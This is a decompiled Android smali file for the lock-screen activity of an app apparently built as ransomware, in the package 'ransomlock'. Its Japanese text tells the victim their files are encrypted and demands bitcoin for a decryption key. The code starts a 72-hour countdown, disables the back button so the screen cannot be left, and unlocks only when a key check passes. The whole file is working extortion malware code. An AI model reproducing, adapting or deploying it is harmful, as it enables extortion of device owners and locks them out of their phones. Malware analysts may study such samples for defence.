.class public Lcom/kithub/ransomlock/LockActivity;
.super Landroid/app/Activity;
.source "LockActivity.java"


# static fields
.field private static final BODY:Ljava/lang/String; = "~\u5b9b\u306b\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3092\u9001\u91d1\u3057\u3001\u5fa9\u53f7\u30ad\u30fc\u3092\u53d6\u5f97\u3059\u308c\u3070\u3001\u5fa9\u53f7\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002"

.field private static final BTN_LABEL:Ljava/lang/String; = ""

.field private static final COUNTDOWN_MILLIS:J = 0xf731400L

.field private static final HEADLINE:Ljava/lang/String; = "\u3042\u306a\u305f\u306e\u30d5\u30a1\u30a4\u30eb\u306f\u6697\u53f7\u5316\u3055\u308c\u307e\u3057\u305f"

.field private static final HINT:Ljava/lang/String; = ""

.field private static final WRONG_MSG:Ljava/lang/String; = ""


# instance fields
.field private bodyView:Landroid/widget/TextView;

.field private countDownTimer:Landroid/os/CountDownTimer;

.field private headlineView:Landroid/widget/TextView;

.field private hintView:Landroid/widget/TextView;

.field private keyInput:Landroid/widget/EditText;

.field private submitButton:Landroid/widget/Button;

.field private timerView:Landroid/widget/TextView;


# direct methods
.method static bridge synthetic -$$Nest$fgettimerView(Lcom/kithub/ransomlock/LockActivity;)Landroid/widget/TextView;
    .locals 0

    iget-object p0, p0, Lcom/kithub/ransomlock/LockActivity;->timerView:Landroid/widget/TextView;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$monSubmit(Lcom/kithub/ransomlock/LockActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/kithub/ransomlock/LockActivity;->onSubmit()V

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 15
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private applyStrings()V
    .locals 2

    .line 63
    const-string v0, "\u3042\u306a\u305f\u306e\u30d5\u30a1\u30a4\u30eb\u306f\u6697\u53f7\u5316\u3055\u308c\u307e\u3057\u305f"

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    iget-object v1, p0, Lcom/kithub/ransomlock/LockActivity;->headlineView:Landroid/widget/TextView;

    invoke-virtual {v1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 64
    :cond_0
    const-string v0, "~\u5b9b\u306b\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3092\u9001\u91d1\u3057\u3001\u5fa9\u53f7\u30ad\u30fc\u3092\u53d6\u5f97\u3059\u308c\u3070\u3001\u5fa9\u53f7\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002"

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lcom/kithub/ransomlock/LockActivity;->bodyView:Landroid/widget/TextView;

    invoke-virtual {v1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 65
    :cond_1
    const-string v0, ""

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_2

    iget-object v1, p0, Lcom/kithub/ransomlock/LockActivity;->hintView:Landroid/widget/TextView;

    invoke-virtual {v1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 66
    :cond_2
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_3

    iget-object v1, p0, Lcom/kithub/ransomlock/LockActivity;->submitButton:Landroid/widget/Button;

    invoke-virtual {v1, v0}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 67
    :cond_3
    return-void
.end method

.method private onSubmit()V
    .locals 3

    .line 94
    iget-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->keyInput:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    .line 96
    .local v0, "input":Ljava/lang/String;
    invoke-static {v0}, Lcom/kithub/ransomlock/CryptoChecker;->checkKey(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 98
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/kithub/ransomlock/UnlockedActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 99
    .local v1, "intent":Landroid/content/Intent;
    invoke-virtual {p0, v1}, Lcom/kithub/ransomlock/LockActivity;->startActivity(Landroid/content/Intent;)V

    .line 100
    invoke-virtual {p0}, Lcom/kithub/ransomlock/LockActivity;->finish()V

    .line 101
    .end local v1    # "intent":Landroid/content/Intent;
    goto :goto_0

    .line 102
    :cond_0
    const-string v1, ""

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_1

    sget v1, Lcom/kithub/ransomlock/R$string;->wrong_key:I

    invoke-virtual {p0, v1}, Lcom/kithub/ransomlock/LockActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    .line 103
    .local v1, "msg":Ljava/lang/String;
    :cond_1
    const/4 v2, 0x0

    invoke-static {p0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    .line 105
    .end local v1    # "msg":Ljava/lang/String;
    :goto_0
    return-void
.end method

.method private startCountdownIfNeeded()V
    .locals 7

    .line 74
    new-instance v6, Lcom/kithub/ransomlock/LockActivity$2;

    const-wide/32 v2, 0xf731400

    const-wide/16 v4, 0x3e8

    move-object v0, v6

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lcom/kithub/ransomlock/LockActivity$2;-><init>(Lcom/kithub/ransomlock/LockActivity;JJ)V

    iput-object v6, p0, Lcom/kithub/ransomlock/LockActivity;->countDownTimer:Landroid/os/CountDownTimer;

    .line 90
    iget-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->countDownTimer:Landroid/os/CountDownTimer;

    invoke-virtual {v0}, Landroid/os/CountDownTimer;->start()Landroid/os/CountDownTimer;

    .line 91
    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    .line 117
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 40
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 41
    sget v0, Lcom/kithub/ransomlock/R$layout;->activity_lock:I

    invoke-virtual {p0, v0}, Lcom/kithub/ransomlock/LockActivity;->setContentView(I)V

    .line 43
    sget v0, Lcom/kithub/ransomlock/R$id;->headline:I

    invoke-virtual {p0, v0}, Lcom/kithub/ransomlock/LockActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->headlineView:Landroid/widget/TextView;

    .line 44
    sget v0, Lcom/kithub/ransomlock/R$id;->body:I

    invoke-virtual {p0, v0}, Lcom/kithub/ransomlock/LockActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->bodyView:Landroid/widget/TextView;

    .line 45
    sget v0, Lcom/kithub/ransomlock/R$id;->hint:I

    invoke-virtual {p0, v0}, Lcom/kithub/ransomlock/LockActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->hintView:Landroid/widget/TextView;

    .line 46
    sget v0, Lcom/kithub/ransomlock/R$id;->timer:I

    invoke-virtual {p0, v0}, Lcom/kithub/ransomlock/LockActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->timerView:Landroid/widget/TextView;

    .line 47
    sget v0, Lcom/kithub/ransomlock/R$id;->key_input:I

    invoke-virtual {p0, v0}, Lcom/kithub/ransomlock/LockActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->keyInput:Landroid/widget/EditText;

    .line 48
    sget v0, Lcom/kithub/ransomlock/R$id;->submit_button:I

    invoke-virtual {p0, v0}, Lcom/kithub/ransomlock/LockActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->submitButton:Landroid/widget/Button;

    .line 50
    invoke-direct {p0}, Lcom/kithub/ransomlock/LockActivity;->applyStrings()V

    .line 51
    invoke-direct {p0}, Lcom/kithub/ransomlock/LockActivity;->startCountdownIfNeeded()V

    .line 53
    iget-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->submitButton:Landroid/widget/Button;

    new-instance v1, Lcom/kithub/ransomlock/LockActivity$1;

    invoke-direct {v1, p0}, Lcom/kithub/ransomlock/LockActivity$1;-><init>(Lcom/kithub/ransomlock/LockActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 59
    return-void
.end method

.method protected onDestroy()V
    .locals 1

    .line 109
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 110
    iget-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->countDownTimer:Landroid/os/CountDownTimer;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/kithub/ransomlock/LockActivity;->countDownTimer:Landroid/os/CountDownTimer;

    invoke-virtual {v0}, Landroid/os/CountDownTimer;->cancel()V

    .line 111
    :cond_0
    return-void
.end method
